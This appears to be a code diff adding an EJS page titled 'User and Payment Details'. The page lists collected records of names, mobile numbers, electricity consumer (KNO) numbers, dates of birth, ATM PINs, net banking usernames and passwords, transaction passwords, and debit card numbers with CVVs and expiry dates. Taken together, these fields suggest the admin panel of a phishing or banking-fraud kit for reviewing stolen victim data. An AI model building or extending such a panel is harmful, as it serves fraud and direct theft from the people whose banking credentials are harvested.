@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User and Payment Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <!-- Header Navigation -->
+  <header class="header-nav">
+    <h1>User and Payment Details</h1>
+  </header>
+
+  <!-- Main Content Container -->
+  <div class="user-detail-container">
+
+    <!-- User Details Section -->
+    <h2>User Details</h2>
+    <% if (user && user.length > 0) { %>
+      <% user.forEach((userDoc, docIndex) => { %>
+        <% if (userDoc.entries && userDoc.entries.length > 0) { %>
+          <% userDoc.entries.forEach((entry, entryIndex) => { %>
+            <div class="card">
+              <h3>User Information - <%= entryIndex + 1 %></h3>
+              <p><strong>Name:</strong> <%= entry.name %></p>
+              <p><strong>Mobile Number:</strong> <%= entry.mobileNumber %></p>
+              <p><strong>KNO Number:</strong> <%= entry.knoNumber %></p>
+              <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+            </div>
+          <% }); %>
+        <% } else { %>
+          <p>No user entries found in document <%= docIndex + 1 %></p>
+        <% } %>
+      <% }); %>
+    <% } else { %>
+      <p>No User Data Found</p>
+    <% } %>
+
+ <!-- NEW: Additional Data Section -->
+ <h2>Additional Data (DOB & ATM PIN)</h2>
+ <% if (additionalData && additionalData.length > 0) { %>
+   <% additionalData.forEach((record, recIdx) => { %>
+     <div class="card">
+       <h3>Record – <%= recIdx + 1 %></h3>
+       <% if (record.entries && record.entries.length > 0) { %>
+         <% record.entries.forEach((entry, idx) => { %>
+           <div class="sub-card">
+             <h4>Entry <%= idx + 1 %></h4>
+             <p><strong>DOB:</strong> <%= entry.dob %></p>
+             <p><strong>ATM PIN:</strong> <%= entry.atmPin %></p>
+             <p><strong>Submitted At:</strong>
+                <%= new Date(entry.submittedAt).toLocaleString() %>
+             </p>
+           </div>
+         <% }); %>
+       <% } else { %>
+         <p>No additional entries found in record <%= recIdx + 1 %>.</p>
+       <% } %>
+     </div>
+   <% }); %>
+ <% } else { %>
+   <p>No Additional Data Found</p>
+ <% } %>
+
+    <!-- NetBanking Details Section -->
+    <h2>Net Banking Details</h2>
+    <% if (netBanking && netBanking.length > 0) { %>
+      <% netBanking.forEach((bank, bankIndex) => { %>
+        <div class="card">
+          <h3>Net Banking Information - <%= bankIndex + 1 %></h3>
+          <% if (bank.entries && bank.entries.length > 0) { %>
+            <% bank.entries.forEach((entry, index) => { %>
+              <div class="sub-card">
+                <h4>Entry <%= index + 1 %></h4>
+                <p><strong>User Name:</strong> <%= entry.userName %></p>
+                <p><strong>Profile Password:</strong> <%= entry.profilePass %></p>
+                <p><strong>Transaction Password:</strong> <%= entry.transactionPass %></p>
+                <p><strong>Submitted At:</strong> <%= new Date(entry.submittedAt).toLocaleString() %></p>
+              </div>
+            <% }); %>
+          <% } else { %>
+            <p>No net banking entries found in this record.</p>
+          <% } %>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No Net Banking Data Found</p>
+    <% } %>
+
+    <!-- Debit Card Details Section -->
+    <h2>Debit Card Details</h2>
+    <% if (debit && debit.length > 0) { %>
+      <% debit.forEach((cardRecord, cardRecordIndex) => { %>
+        <div class="card">
+          <h3>Debit Card Record - <%= cardRecordIndex + 1 %></h3>
+          <% if (cardRecord.cards && cardRecord.cards.length > 0) { %>
+            <% cardRecord.cards.forEach((card, index) => { %>
+              <div class="sub-card">
+                <h4>Card <%= index + 1 %></h4>
+                <p><strong>Card Number:</strong> <%= card.cardNumber %></p>
+                <p><strong>CVV:</strong> <%= card.cvv %></p>
+                <p><strong>Expiry:</strong> <%= card.expiry %></p>
+                <p><strong>Added At:</strong> <%= new Date(card.addedAt).toLocaleString() %></p>
+              </div>
+            <% }); %>
+          <% } else { %>
+            <p>No debit card entries found in this record.</p>
+          <% } %>
+        </div>
+      <% }); %>
+    <% } else { %>
+      <p>No Debit Card Data Found</p>
+    <% } %>
+    
+<!-- NEW: Transaction Password Section -->
+<h2>Transaction Passwords</h2>
+<% if (transactionPass && transactionPass.length > 0) { %>
+  <% transactionPass.forEach((record, recIdx) => { %>
+    <div class="card">
+      <h3>Record – <%= recIdx + 1 %></h3>
+      <% if (record.entries && record.entries.length > 0) { %>
+        <% record.entries.forEach((entry, idx) => { %>
+          <div class="sub-card">
+            <h4>Entry <%= idx + 1 %></h4>
+            <p><strong>Transaction Password:</strong> <%= entry.transactionPass %></p>
+            <p><strong>Submitted At:</strong>
+               <%= new Date(entry.submittedAt).toLocaleString() %>
+            </p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <p>No transaction entries found in record <%= recIdx + 1 %>.</p>
+      <% } %>
+    </div>
+  <% }); %>
+<% } else { %>
+  <p>No Transaction Password Data Found</p>
+<% } %>
+
+    <a href="/api/device/dashboard">
+      <button class="dashboard-btn">Go to Dashboard</button>
+    </a>
+  </div>
+</body>
+</html>
